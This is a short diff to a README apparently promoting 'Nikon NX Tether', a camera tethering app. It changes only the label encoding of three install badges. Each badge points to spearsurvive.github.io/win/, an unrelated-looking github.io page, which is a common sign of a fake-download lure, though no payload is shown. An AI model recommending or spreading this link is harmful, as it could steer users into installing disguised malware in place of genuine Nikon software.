@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Nikon NX Tether](https://img.shields.io/badge/⬇_Install_Nikon%20NX%20Tether-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nikon NX Tether](https://img.shields.io/badge/⬇_Install_Nikon+NX+Tether-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Nikon NX Tether is a free tethered shooting application for Nikon cameras that a
 
 <div align="center">
 
-[![⬇ Install Nikon NX Tether](https://img.shields.io/badge/⬇_Install_Nikon%20NX%20Tether-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nikon NX Tether](https://img.shields.io/badge/⬇_Install_Nikon+NX+Tether-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Nikon NX Tether is a free tethered shooting application for Nikon cameras that a
 
 <div align="center">
 
-[![⬇ Install Nikon NX Tether](https://img.shields.io/badge/⬇_Install_Nikon%20NX%20Tether-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Nikon NX Tether](https://img.shields.io/badge/⬇_Install_Nikon+NX+Tether-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
